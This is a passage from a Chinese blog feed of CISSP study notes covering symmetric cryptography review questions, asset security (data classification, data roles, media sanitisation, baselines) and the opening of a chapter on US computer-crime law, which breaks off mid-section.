电子代码本(ECB)模式、密码分组链接(CBC)模式、密码回馈(CFB)模式和输出回馈(OFB)模式。ECB模式被认为是最不安全的，并且只用于短消息。3DES使用DES的三次选代，利用两或三个不同的密钥，从而将密钥的有效强度各自增加到112位或168位。</li><li><strong>了解高级加密标准(AES)</strong> 高级加密标准使用Rijndael算法，并且是美国政府安全交换敏感但非分类数据的标准。AES使用128、192和256位的密钥和固定128位大小的分组达到比旧的DES算法高得多的安全性。</li></ul><h3 id="6-6-复习题"><a href="#6-6-复习题" class="headerlink" title="6.6 复习题"></a>6.6 复习题</h3><ol><li><p>4位的密钥空间存在多少个密钥?<br>A. 4<br>B. 8<br>C. 16<br>D. 128</p></li><li><p>Jolm近期收到一封来自Bill的电子邮件。需要满足什么密码学目标，才能让John相信Bill是这封邮件的发送者?<br>A. 不可否认性<br>B. 机密性<br>C. 可用性<br>D. 完整性</p></li><li><p>数据加密标准(DES)密码系统中使用的密钥长度是多少?<br>A. 56位<br>B. 128位<br>C. 192位<br>D. 256位</p></li><li><p>什么类型的加密方式，依赖于不断变化消息中字符的位置去实现机密性?<br>A. 流加密<br>B. 换位加密<br>C. 块加密<br>D. 替换加密</p></li><li><p>下列哪一个不是高级加密标准Rijndael算法可能的密钥长度?<br>A. 56位<br>B. 128位<br>C. 192位<br>D. 256位</p></li><li><p>秘密密钥加密系统不能实现下列哪一项?<br>A. 不可否认性<br>B. 机密性<br>C. 可用性<br>D. 密钥分发</p></li><li><p>如果配置正确，己知唯一的牢不可破的加密系统是什么?<br>A. 换位密码<br>B. 替代密码<br>C. 高级加密标准<br>D. 一次性填充</p></li><li><p>数学函数16模3的输出值是多少?<br>A. 0<br>B. 1<br>C. 3<br>D. 5</p></li><li><p>在20世纪40年代，一队来自美国的密码破译专家成功破解了基于一次一密的被称为VENONA的项目。该项目破坏了什么规则，导致引起这个事件?<br>A. 密钥值必须随机<br>B. 密钥值必须和信息一样长<br>C. 密钥值必须仅能被用一次<br>D. 密钥值必须防止物理泄露</p></li><li><p>以下密码类型中，哪一项对大块的消息而不是单个字符或位的消息进行操作?<br>A. 流加密<br>B. 凯撒加密<br>C. 块加密<br>D. ROT3加密</p></li><li><p>为了通过使用对称加密算法对双向通信进行保护，需要的加密密钥的最小数目是多少?<br>A. 1<br>B. 2<br>C. 3<br>D. 4</p></li><li><p>Dave正在开发一个需要多人才能取回密钥的密钥托管系统，但并不依靠每个参与者到现场。他正在使用什么类型的技术?<br>A. 分割知识<br>B. M of N控制<br>C. 工作函数<br>D. 零知识证明</p></li><li><p>下面哪种数据加密标准(DES)操作模式能被用于大量信息，确保在加密/解密过程中不会因为一个早期的错误而破坏整个通信?<br>A. 密码分组链接(CBC)<br>B. 电子代码本(ECB)<br>C. 密码回馈(CFB)<br>D. 输出回馈(OFB)</p></li><li><p>许多加密算法依赖于分解大素数乘积的难题。它们依靠的这个问题的特点是什么?<br>A. 包含扩散<br>B. 包含泪淆<br>C. 包含单向函数<br>D. 遵照Kerchoff原则</p></li><li><p>全面实现有10人参与的对称算法需要多少个密钥?<br>A. 10<br>B. 20<br>C. 45<br>D. 100</p></li><li><p>高级加密标准使用的分块大小是多少?<br>A. 32位<br>B. 64位<br>C. 128位<br>D. 可变</p></li><li><p>什么样的攻击，使得凯撒密码几乎无法使用?<br>A. 中间人攻击<br>B. 托管攻击<br>C. 频率分析攻击<br>D. 换位攻击</p></li><li><p>什么类型的密码系统经常利用一个通道，借助一本著名的书来加密密钥?<br>A. Vernam 加密<br>B. 轮换密钥加密<br>C. Skipjack 加密<br>D. Twofish 加密</p></li><li><p>哪个入围的AES利用了预白噪声化和后白噪声化技术?<br>A. Rijndael<br>B. Twofish<br>C. Blowfish<br>D. Skipjack</p></li><li><p>全面实现有10人参与的非对称算法需要多少个密钥?<br>A. 10<br>B. 20<br>C. 45<br>D. 100</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中密码学与对称加密算法章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（5）——保护资产的安全</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%885%EF%BC%89%E2%80%94%E2%80%94%E4%BF%9D%E6%8A%A4%E8%B5%84%E4%BA%A7%E7%9A%84%E5%AE%89%E5%85%A8/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（5）——保护资产的安全/</id>
    <published>2018-09-12T06:22:48.000Z</published>
    <updated>2018-10-11T10:12:52.880Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：</p><ul><li>A. 人对信息及支持资产进行分类(如敏感性、关键性)</li><li>B. 确定及维护所有权(如数据所有者、系统所有者、业务/任务所有者)</li><li>C. 保护隐私<ul><li>C.l 数据所有者</li><li>C.2 数据处理者</li><li>C.3 数据剩磁</li><li>C.4 收集限制</li></ul></li><li>D. 确保适当地保留资产(如介质、硬件、人员)</li><li>E. 确定数据安全控制(如静态数据、传输过程中的数据)<ul><li>E.l 基准线</li><li>E.2 审视和定制</li><li>E.3 标准选择</li><li>E.4 密码学</li></ul></li><li>F. 建立处理需求(敏感信息的标记、贴签、存储、破坏)</li></ul><h3 id="5-1-对资产进行分类和标记"><a href="#5-1-对资产进行分类和标记" class="headerlink" title="5.1 对资产进行分类和标记"></a>5.1 对资产进行分类和标记</h3><h4 id="5-1-1-定义敏感数据"><a href="#5-1-1-定义敏感数据" class="headerlink" title="5.1.1 定义敏感数据"></a>5.1.1 定义敏感数据</h4><p>　　敏感数据指所有不公开或未分类的信息，可能包括组织需要保护的机密、专有信息，或因数据对组织的价值或组织为遵守现行法律、法规而保护的任何其他类型的数据。</p><ul><li><strong>个人身份信息</strong> 个人身份信息(PII)是指任何可以识别个人的信息。</li><li><strong>受保护的健康信息</strong> 受保护的健康信息(PHI)是任何与个人健康有关的信息。</li><li><strong>专有数据</strong> 专有数据指的是任何帮助组织保持竞争优势的数据。可以是开发的软件代码、产品的技术计划、内部流程、知识产权或商业秘密。</li></ul><h4 id="5-1-2-定义分类"><a href="#5-1-2-定义分类" class="headerlink" title="5.1.2 定义分类"></a>5.1.2 定义分类</h4><p>　　组织通常会在安全策略或在单独的数据策略中包括数据分类。数据分类识别的是数据对于组织的价值，并对数据的机密性和完整性保护至关重要。策略确定了组织内使用的分类标签，还确定了数据所有者如何确定合适的分类以及人员应如何根据分类保护数据。<br><img src="/notes/cissp学习笔记（5）——保护资产的安全/数据分类.png"></p><h4 id="5-1-3-定义数据安全要求"><a href="#5-1-3-定义数据安全要求" class="headerlink" title="5.1.3 定义数据安全要求"></a>5.1.3 定义数据安全要求</h4><p>　　组织至少应该对比较敏感的邮件进行标记和加密。加密是将明文转换为密文，从而增加阅读的难度。采用强大的加密方法，例如，拥有256位加密密钥的高级加密标准(AES 256)，使未被授权者能够阅读加密文章的可能性几乎为零。</p><h4 id="5-1-4-理解数据状态"><a href="#5-1-4-理解数据状态" class="headerlink" title="5.1.4 理解数据状态"></a>5.1.4 理解数据状态</h4><p>　　在数据静止、传输以及使用过程中，保护数据的安全性是非常重要的。保护数据机密性的最好方法是使用强大的加密协议。此外，强大的身份验证和授权控制能有效阻止未经授权的访问。</p><h4 id="5-1-5-管理敏感数据"><a href="#5-1-5-管理敏感数据" class="headerlink" title="5.1.5 管理敏感数据"></a>5.1.5 管理敏感数据</h4><p>　　管理敏感数据的一个主要目标是防止数据泄露。数据泄露会使任何一个未被授权的实体查看或访问敏感数据。</p><h5 id="1-标记敏感数据"><a href="#1-标记敏感数据" class="headerlink" title="1. 标记敏感数据"></a>1. 标记敏感数据</h5><p>　　对敏感数据进行标记(通常称为贴签)能确保用户可以轻松识别任何数据的分类级别。标记或标签提供的最重要信息就是关于数据的分类。标记包括物理的和电子的标记和标签。物理标签能指出存储在介质或处理系统上的数据的安全性分类。</p><h5 id="2-管理敏感数据"><a href="#2-管理敏感数据" class="headerlink" title="2. 管理敏感数据"></a>2. 管理敏感数据</h5><p>　　管理敏感数据是指在介质的整个生命周期内确保传送过程的安全。人们依据数据的价值和分类对其进行不同的管理，高级机密信息需要更强大的保护。</p><h5 id="3-存储敏感数据"><a href="#3-存储敏感数据" class="headerlink" title="3. 存储敏感数据"></a>3. 存储敏感数据</h5><p>　　敏感数据应存储在受保护且没有任何损失的介质中。最有效的保护办法就是加密。此外，也应该采取环境控制来保护介质的数据安全。这些做法包括温度和湿度控制等。这里有一点终端用户经常忘记： 任何敏感数据的价值都大于存储介质的价值。</p><h5 id="4-销毁敏感数据"><a href="#4-销毁敏感数据" class="headerlink" title="4. 销毁敏感数据"></a>4. 销毁敏感数据</h5><p>　　适当的破坏可以确保敏感数据不会落入投机者的手中，从而防止未经授权的数据泄露。</p><ul><li><strong>擦除</strong> 擦除介质上的数据就是对文件、文件的选择或整个介质执行删除操作。</li><li><strong>消除</strong> 消除或重写是使介质可以重新使用的一个准备过程，这个过程可以确保消除的数据不会通过传统的工具恢复。</li><li><strong>清除</strong> 清除是比消除更强烈的一种形式，是指在安全性较差的环境中使介质达到可再次使用的准备过程，确保原始数据使用任何己知方法都不会恢复。</li><li><strong>解除分类</strong> 解除分类是指在非机密情况下对介质或系统进行清除，以使其能够再次使用的准备过程。</li><li><strong>净化</strong> 净化是指从系统或介质中删除数据，确保数据不会以任何形式恢复。</li><li><strong>消磁</strong> 消磁工具会建立一个强大的磁场区域，从而以消磁的方法擦除介质上的数据。</li><li><strong>销毁</strong> 销毁是介质生命周期的最后阶段，也是清除介质数据的最安全方法。</li></ul><h5 id="5-保留资产"><a href="#5-保留资产" class="headerlink" title="5. 保留资产"></a>5. 保留资产</h5><p>　　保留要求适用于数据或记录、含有敏感数据的介质和系统，以及接触敏感数据的人员。记录保留和介质保留是资产保留的最重要元素。记录保留指的是，在需要信息时保留和维护重要的信息，在不需要时破坏信息。</p><h4 id="5-1-6-应用密码学保护机密文件"><a href="#5-1-6-应用密码学保护机密文件" class="headerlink" title="5.1.6 应用密码学保护机密文件"></a>5.1.6 应用密码学保护机密文件</h4><h5 id="1-应用对称加密保护数据"><a href="#1-应用对称加密保护数据" class="headerlink" title="1. 应用对称加密保护数据"></a>1. 应用对称加密保护数据</h5><p>　　对称加密在加密和解密数据一时应用同样的密钥。</p><ul><li><strong>高级加密标准算法</strong> 高级加密标准算法(AES)是众多算法中最受欢迎的对称加密算法。2001年，美国国家标准技术研究所将它选为标准算法，用以替代旧的数据加密标准算法(DES)。高级加密标准支持的密钥长度为128位、192位和256位。</li><li><strong>三重数据加密标准算法</strong> 开发者开发了三重数据加密标准算法(3DES)，用以替代数据加密标准算法(DES)。初始实现使用56位密钥，但是新的算法实现了使用112位或168位密钥。</li><li><strong>Blowfish</strong> Blowfish可用的密钥长度为32位至448位，是一个强大的加密协议。Linux 系统使用bcrypt来加密密码，而bcrypt 这款跨平台文件加密工具就是基于Blowfish。bcrypt添加了额外的128位密钥作为salt值来阻止彩虹表攻击(rainbow table attack) 。</li></ul><h5 id="2-应用传输加密保护数据"><a href="#2-应用传输加密保护数据" class="headerlink" title="2. 应用传输加密保护数据"></a>2. 应用传输加密保护数据</h5><p>　　传输加密算法在传播之前加密数据，对传输过程中的数据进行保护。通过网络发送未加密数据的最主要风险就是嗅探攻击。攻击者可以使用嗅探器或协议分析器在网络上捕捉流量。嗅探器允许攻击者读取所有以明文发送的数据。</p><h3 id="5-2-定义数据角色"><a href="#5-2-定义数据角色" class="headerlink" title="5.2 定义数据角色"></a>5.2 定义数据角色</h3><h4 id="5-2-1-数据所有者"><a href="#5-2-1-数据所有者" class="headerlink" title="5.2.1 数据所有者"></a>5.2.1 数据所有者</h4><p>　　数据所有者是数据的最终责任人。NIST SP 800-18 概括了信息所有者的以下责任，也可以理解为同样是数据所有者的责任：</p><ul><li>制定规则，以便用于主体的数据或信息的适当使用及保护(行为规则)。</li><li>为信息系统所有者提供输入，要考虑到信息所在地的信息系统的安全要求和安全控制。</li><li>决定谁有权访问信息系统，拥有何种特权或准入权。</li><li>协助对信息所在地的普通安全控制进行定义和评估。</li></ul><h4 id="5-2-2-系统所有者"><a href="#5-2-2-系统所有者" class="headerlink" title="5.2.2 系统所有者"></a>5.2.2 系统所有者</h4><p>　　系统所有者是拥有含机密数据的系统的人。NIST SP 800-18 概括了系统所有者的以下责任：</p><ul><li>开发和信息所有者、系统管理者、功能终端使用者相一致的系统安全计划。</li><li>维持系统安全计划井确保系统依照己经同意的安全要求进行部署和运行。</li><li>确保系统使用者和支持人员受到适当的安全培训，如行为规则说明(或是AUP) 。</li><li>当发生重大变化时，更新系统安全计划。</li><li>协助定义、执行和评估通用安全控制。</li></ul><h4 id="5-2-3-业务-任务所有者"><a href="#5-2-3-业务-任务所有者" class="headerlink" title="5.2.3 业务/任务所有者"></a>5.2.3 业务/任务所有者</h4><p>　　NIST SP 800-18 指的是业务/任务所有者作为项目经理或信息系统所有者。同样，业务/任务所有者的责任可以和系统所有者的责任有重叠或相同。业务所有者拥有的程序可能是由其他实体管理的系统。</p><h4 id="5-2-4-数据处理者"><a href="#5-2-4-数据处理者" class="headerlink" title="5.2.4 数据处理者"></a>5.2.4 数据处理者</h4><p>　　欧盟数据保护法将数据处理者定义为”一个自然人或法人，他拥有个人资料，仅代表数据控制者的利益”。在该条文中，数据控制者是一个控制数据过程的人或实体。</p><h4 id="5-2-5-管理员"><a href="#5-2-5-管理员" class="headerlink" title="5.2.5 管理员"></a>5.2.5 管理员</h4><p>　　数据管理员负责将数据以合适的方式授予人员。他们不-定必须拥有全部管理者权限和特权，但是他们可以分配权限。管理员分配权限时需要基于最低权限准则和须知，只有在工作有需要时才会授予使用者。管理员通常会使用基于角色的访问控制模型来分配权限。</p><h4 id="5-2-6-保管者"><a href="#5-2-6-保管者" class="headerlink" title="5.2.6 保管者"></a>5.2.6 保管者</h4><p>　　数据所有者经常将每天的任务委任给保管者。通过以适当方式保存和保护数据，保管者协助保护数据的安全性和完整性。在实际中，信息技术部门的人员或者系统安全管理员通常会成为保管者。他们可能是负责分配权限的相同管理员。</p><h4 id="5-2-7-用户"><a href="#5-2-7-用户" class="headerlink" title="5.2.7 用户"></a>5.2.7 用户</h4><p>　　用户就是任何通过计算系统获取数据并完成工作任务的人。用户只能获取他们需要用来完成工作任务的数据。</p><h3 id="5-3-保护隐私"><a href="#5-3-保护隐私" class="headerlink" title="5.3 保护隐私"></a>5.3 保护隐私</h3><p>　　组织有义务保护他们收集和保存的数据。很多法律要求组织披露他们收集到的数据、收集数据的原因以及准备怎样使用这些信息。此外，这些法律禁止组织以正当使用信息之外的方法使用这些信息。在保护隐私时，组织通常会使用一些不同的安全控制。选择适当的安全控制是一项令人生畏的任务，尤其是对于那些新成立的组织而言。然而，使用安全基准线以及定义相关标准让这项任务变得更简单。</p><h4 id="5-3-1-使用安全基线"><a href="#5-3-1-使用安全基线" class="headerlink" title="5.3.1 使用安全基线"></a>5.3.1 使用安全基线</h4><p>　　基线提供了一个起点，确保最低安全标准。各组织使用的一条普通的基线就是镜像。将系统设置成安全状态之后，审计程序要周期性地检查系统，以确保他们维持在安全状态。NIST SP 800-53 讨论了作为安全控制列表的安全控制基准线。它强调，单一的安全控制不能适用于所有情况，但是任何组织都可以选择一组基准线安全控制，并且根据需求做出调整。</p><h4 id="5-3-2-审视和定制"><a href="#5-3-2-审视和定制" class="headerlink" title="5.3.2 审视和定制"></a>5.3.2 审视和定制</h4><p>　　审视是指评估基线安全控制，然后只选择那些适用于想保护的盯系统的控制。定制是指修改基线内的安全控制列表，使其与组织的使命相适应。</p><h4 id="5-3-3-选择标准"><a href="#5-3-3-选择标准" class="headerlink" title="5.3.3 选择标准"></a>5.3.3 选择标准</h4><p>　　在选择基线内的安全控制时，组织需要确保控制符合某些外部安全标准。外部元素通常定义了对组织的强制性要求。</p><h3 id="5-4-考试要点"><a href="#5-4-考试要点" class="headerlink" title="5.4 考试要点"></a>5.4 考试要点</h3><ul><li><strong>理解数据分类的重要性</strong> 数据所有者负责定义数据分类，确保系统和数据被正确标记。此外，数据所有者定义保护不同分类的数据的需求，比如对静态数据和传输中的敏感数据进行加密。数据分类通常在安全策略或数据策略中定义。</li><li><strong>知道PII和PHI</strong> 个人身份信息(PII)是任何可以识别个人的信息。受保护的健康信息(PHI)是指任何与特定个人的健康有关的信息。许多法律、法规都规定保护PII和PHI。</li><li><strong>知道如何处理敏感信息</strong> 敏感信息是指所有类型的机密信息，正确地管理它们可以帮助防止由于未经授权的披露而失去保密。适当的管理包括标志、处理、存储和破坏敏感信息。组织经常漏掉标记的两个区域是充分保护承载敏感信息的备份介质以及在介质和设备生命周期结束时对其进行净化。</li><li><strong>理解记录保留</strong> 记录保留策略确保在需要数据时，将数据保存在可用状态，在不需要数据时将其破坏。许多法律、法规都规定数据要在特定的时间内进行保存，但是没有正式的规定，因此组织会在策略中指定保留时间。审计跟踪数据需要保持足够长的时间来重建过去的事件，但是组织必须确定他们想要调查多久之前的数据。许多组织当前的趋势是通过对电子邮件实施短期保留策略来减少法律责任。</li><li><strong>知道不同角色之间的区别</strong> 数据所有者负责分类、标记和保护数据。系统所有者负责处理数据的系统。业务和任务所有者拥有流程，并确保系统对组织的价值。数据处理者通常是为组织处理数据的第三方实体。管理员基于数据所有者提供的指导方针授权访问数据。用户在执行工作任务的过程中访问数据。保管者负责日常存储和保护数据。</li><li><strong>了解7 条安全港原则</strong> 欧盟数据保护法规定保护隐私数据。第三方同意遵守7 条安全港原则，以确保它们遵守欧盟数据保护法。7 条原则是通知、选择、向前传输、安全性、数据完整性、访问和执行。</li><li><strong>了解安全控制基线</strong> 安全控制基线提供一份组织可以用作基线的控制清单，并不是所有的基线适用于所有的组织。然而，组织可以应用审视和定制技术来选择满足自身需求的基线。</li></ul><h3 id="5-5-复习题"><a href="#5-5-复习题" class="headerlink" title="5.5 复习题"></a>5.5 复习题</h3><ol><li><p>下面哪一项指的是分类过程的主要目的?<br>A. 定义保护敏感数据的要求<br>B. 定义备份数据的要求<br>C. 定义存储数据的要求<br>D. 定义传输数据的要求</p></li><li><p>在确定数据分类时，以下哪一项是最重要的考虑因素?<br>A. 处理系统<br>B. 价值<br>C. 存储介质<br>D 可访问性</p></li><li><p>以下哪个答案不属于敏感数据?<br>A. 个人身份信息(PII)<br>B. 受保护的健康信息(PHI)<br>C. 专有数据<br>D 发布在网站上的数据</p></li><li><p>标记介质的最重要方面是什么?<br>A. 日期标签<br>B. 内容描述<br>C. 电子标签<br>D. 分类</p></li><li><p>在将分类介质再次用到不太安全的环境中之前，管理员通常会怎样做?<br>A. 擦除<br>B. 消除<br>C. 消除<br>D. 重写</p></li><li><p>以下哪个描述正确表述了净化方法的问题?<br>A. 没有移除数据的方法，保证了未授权人员不能检索数据。<br>B. 即使已被完全焚烧的介质也会提供可推断出的数据。<br>C. 人员可能会不适当地执行净化步骤。<br>D. 存储的数据被物理销毁介质。</p></li><li><p>以下哪个选项是摧毁固态硬盘上数据的最可靠方法?<br>A. 擦除<br>B. 去磁<br>C. 删除<br>D. 清除</p></li><li><p>以下哪个选项是删除DVD上数据的最安全方法?<br>A. 格式化<br>B. 删除<br>C. 销毁<br>D. 去磁</p></li><li><p>以下哪一项不会擦除数据?<br>A. 消除<br>B. 清除<br>C. 重写<br>D. 剩磁</p></li><li><p>以下哪一项基于Blowfish并能保护免受彩虹表袭击?<br>A. 3DES<br>B. AES<br>C. bcrypt<br>D. SCP</p></li><li><p>管理员会用以下哪一项来安全连接远程服务器以进行管理?<br>A. Telnet<br>B. 安全文件传输协议(SFTP)<br>C. 安全拷贝(SCP)<br>D. 安全外壳(SSH)</p></li><li><p>以下哪一项是保管者通常会执行的任务?<br>A. 访问数据<br>B. 分类数据<br>C. 分配数据权限<br>D. 备份数据</p></li><li><p>以下哪个数据角色最可能有权授予用户对数据的访问权?<br>A. 管理员<br>B. 保管者<br>C. 所有者<br>D. 用户</p></li><li><p>以下哪一项是对数据所有者确立的”行为规则”的最好定义?<br>A. 确保用户只被授予对他们所需东西的访问权。<br>B. 决定对系统有访问权的人。<br>C. 识别对数据的恰当使用和保护。<br>D. 对系统实施安全控制。</p></li><li><p>在欧盟数据保护法的背景下，以下哪一个是数据处理者?<br>A. 代表数据控制者处理个人数据的实体<br>B. 控制数据处理的实体<br>C. 处理数据的计算系统<br>D. 处理数据的网络</p></li><li><p>通知、选择、向前传输及访问原则最适用的是?<br>A. 保密<br>B. 识别<br>C. 保留<br>D. 分类</p></li><li><p>组织正在实施安全控制的预选基线，但发现不是所有的控制都适用。他们应该做些什么呢?<br>A. 不管怎样，实施所有控制<br>B. 确定另一条基线<br>C. 重新创建一条基线<br>D. 根据他们的需求定制基线</p></li></ol><p>在回答问题18至20时请参考下面的场景：一个组织有一个数据中心，24小时全天处理高级敏感信息。数据中心包括电子邮件服务器，管理员会清理超过6个月的电子邮件，以遵守组织的安全策略。对数据中心的访问是受控制的，所有处理敏感信息的系统都进行了标记。管理员定期备份在数据中心处理的数据。他们在现场保留一份备份，并把没有标记的备份发送到公司的一个仓库。仓库工人按日期整理介质，他们有过去20年的备份。员工白天在仓库工作，晚上和周末在离开前会将仓库锁闭。最近，仓库发生了盗窃，丢失了所有的离线备份磁带。之后，他们数据的副本，包括几年前的敏感电子邮件，开始出现在互联网网站上，因此组织的内部敏感数据被公开。</p><ol start="18"><li><p>在下面的选项中，哪一项可以在不牺牲安全性的情况下阻止此丢失事件的发生?<br>A. 标记场地外保存的介质<br>B. 不要把数据存储在场地外<br>C. 将场地外的备份全部摧毁<br>D. 使用安全的场地外存储设备</p></li><li><p>以下哪个管理员行为可以阻止此事件的发生?<br>A. 在把磁带送到仓库之前对它们进行标记<br>B. 在磁带上备份数据之前清理磁带<br>C. 在磁带上备份数据之前对磁带进行去磁<br>D. 将磁带加入资产管理数据库</p></li><li><p>在以下选项中，关于备份介质不遵守哪一项策略?<br>A. 介质销毁<br>B. 记录保留<br>C. 配置管理<br>D. 版本控制</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中保护资产的安全章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（4）——法律、法规和合规性</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%E2%80%94%E2%80%94%E6%B3%95%E5%BE%8B%E3%80%81%E6%B3%95%E8%A7%84%E5%92%8C%E5%90%88%E8%A7%84%E6%80%A7/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（4）——法律、法规和合规性/</id>
    <published>2018-09-11T05:42:00.000Z</published>
    <updated>2018-10-11T10:12:52.879Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全和风险管理(例如，安全、风险、合规性、法律、法规、业务连续性)</p><ul><li>C. 合规性<ul><li>C.l 法律和法规遵从</li><li>C.2 隐私需求遵从</li></ul></li><li>D. 理解全球范围内涉及信息安全的法律和法规问题<ul><li>D.l 计算机犯罪</li><li>D.2 许可和知识产权(例如，版权、商标、数字版权管理)</li><li>D.3 进口/出口控制</li><li>D.4 跨境数据流</li><li>D.5 隐私</li><li>D.6 数据破坏</li></ul></li></ul><h3 id="4-1-法律的分类"><a href="#4-1-法律的分类" class="headerlink" title="4.1 法律的分类"></a>4.1 法律的分类</h3><h4 id="4-1-1-刑法"><a href="#4-1-1-刑法" class="headerlink" title="4.1.1 刑法"></a>4.1.1 刑法</h4><p>　　刑法形成了法律体系的基石，维护着我们所处社会的和平和安全。刑法包含针对某些行为的禁令，如谋杀、伤害、抢劫、纵火和类似的犯罪行为。对违反刑法的处罚有一个范围，包括强制性劳教、以罚金形式的货币处罚(或多或少)、以监狱判决形式剥夺公民自由权。</p><h4 id="4-1-2-民法"><a href="#4-1-2-民法" class="headerlink" title="4.1.2 民法"></a>4.1.2 民法</h4><p>　　民法形成了法律体系的大部分。它们用于维护社会秩序，并管理不属于犯罪行为但需要一位公正的仲裁者来解决的个人之间和组织之间的问题。民法还被用于创建政府框架，行政机构使用这个体系架构来履行自己的职责。</p><h4 id="4-1-3-行政法"><a href="#4-1-3-行政法" class="headerlink" title="4.1.3 行政法"></a>4.1.3 行政法</h4><p>　　刑法和民法制定的规则和措施不可能在任何可能的情况下都被遵守。因此，执行机构有制定行政法的回旋余地，从而以政策、规章和制度的方式管理机构的日常运作。虽然行政法不需要立法机构的法案来获得法律的效力，但是必须遵守所有己存在的民法和刑法。</p><h3 id="4-2-法律"><a href="#4-2-法律" class="headerlink" title="4.2 法律"></a>4.2 法律</h3><h4 id="4-2-1-计算机犯罪"><a href="#4-2-1-计算机犯罪" class="headerlink" title="4.2.1 计算机犯罪"></a>4.2.1 计算机犯罪</h4><h5 id="1-计算机诈骗和滥用法案"><a href="#1-计算机诈骗和滥用法案" class="headerlink" title="1. 计算机诈骗和滥用法案"></a>1. 计算机诈骗和滥用法案</h5><p>　　美国国会在1984年首先制定了计算机欺诈和滥用法案(CFAA)，并且通过一些修正后，直到今天仍然在执行。这条法律经过精心编写，专门用于跨越州边界的计算机犯罪，避免违反州的权力和践踏宪法。法案的主要条款主要针对下列这些罪行：</p><ul><li>没有经过授权或超出了权限范围而访问联邦系统中的机密信息或财务信息。</li><li>没有经过授权而访问只能由联邦政府使用的计算机。</li><li>使用联邦计算机进行欺诈活动(除了欺诈的唯一目标是要使用计算机本身) 。</li><li>对联邦计算机系统造成恶意损失超过1000美元的行为。</li><li>修改计算机中的医疗记录，从而影响或可能影响个人的检查、诊断、治疗或医疗看护。</li><li>非法买卖计算机密码，如果非法买卖行为影响了州间的贸易或涉及联邦的计算机系统。</li></ul><p>　　计算机欺诈和滥用法案在1986年经过了修正，法案的作用范围也有所改变。除了处理敏感信息的联邦计算机之外，法案中还包括了所有的涉及联邦利益的计算机。增加了如下范围：</p><ul><li>由美国政府专门使用的所有计算机。由金融机构专门使用的所有计算机。</li><li>当犯罪活动妨碍了政府或机构使用系统的能力时，由政府或金融机构专门使用的计算机。</li><li>不处在同一个州的被用于犯罪活动的所有计算机的组合。</li></ul><h5 id="2-CFAA修正案-1994年"><a href="#2-CFAA修正案-1994年" class="headerlink" title="2. CFAA修正案(1994年)"></a>2. CFAA修正案(1994年)</h5><ul><li>宣布那些可能造成计算机系统损害的、生成任何类型恶意代码的行为是不合法的。</li><li>修改了CFAA，包含了所有被用于州间贸易的计算机，而不只是包含用于联邦利益的计算机系统。</li><li>允许关押罪犯，不管他们是否造成了实际的损坏。</li><li>为计算机犯罪的受害者提供了提起民事诉讼的法律权力，对受到的损失可以申请获得减轻和补偿。</li></ul><h5 id="3-计算机安全法案-1987年"><a href="#3-计算机安全法案-1987年" class="headerlink" title="3. 计算机安全法案(1987年)"></a>3. 计算机安全法案(1987年)</h5><p>　　美国国会成员对他们看到的情况很不满意，进而制定了计算机安全法案(CSA，1987年)，为所有的联邦机构设置了安全要求基准。在引入CSA时，美国国会详细规定了法案的4 个主要目的，如下所示：</p><ul><li>授予美国国家标准技术研究所(NIST)开发联邦计算机系统标准和准则的职责，包括负责为联邦计算机系统开发标准和准则。在适当时使用美国国家安全局(NSA)的技术性建议和援助(包括工作产品)。</li><li>颁布这些标准和准则。</li><li>要求包含敏感信息的联邦计算机系统的所有操作人员制定安全计划。</li><li>要求包含敏感信息的联邦计算机系统所涉及的所有管理、使用和操作人员强制性参加定期培训。</li></ul><p>　　这条法案中宣布的许多要求经过很多年形成了美国联邦计算机安全策略的基础，而且还将计算机安全的责任分摊给两个联邦机构。原来美国国家安全局(NSA)对所有的计算机安全问题都有权限，现在只保留了对机密系统的权限。美国国家标准技术研究所(NIST)获得了负责保护其他所有联邦政府系统的权利。</p><h5 id="4-美国联邦判决指导方针"><a href="#4-美国联邦判决指导方针" class="headerlink" title="4. 美国联邦判决指导方针"></a>4. 美国联邦判决指导方针</h5><p>　　1991年发布的美国联邦判决指导方针提供了处罚指导方针，从而帮助联邦法官解释说明计算机犯罪的相关法律。如下所示，这些指导方针的三个条款对信息安全团体产生了持久的影响：</p><ul><li>指导方针使审慎者规则成为书面形式，这种规则要求高级行政长官个人负责确保平常的适度关注，审慎的个人会经历相同的情况。这条在财政责任领域中开发的规则现在也被应用于信息安全领域。</li><li>通过证明使用适度关注来履行自己的信息安全责任，指导方针允许组织和行政长官遭受最小的违法处罚。</li><li>指导方针概述了三个为疏忽提供证据的责任。首先，被控疏忽的人员必须具有法律上认可的责任。其次，被控人员必须未遵守公认的标准。最后，疏忽行为和随后，的受损之间必须存在因果关系。</li></ul><h5 id="5-美国国家信息基础设施保护法案-1996年"><a href="#5-美国国家信息基础设施保护法案-1996年" class="headerlink" title="5. 美国国家信息基础设施保护法案(1996年)"></a>5. 美国国家信息基础设施保护法案(1996年)</h5><p>　　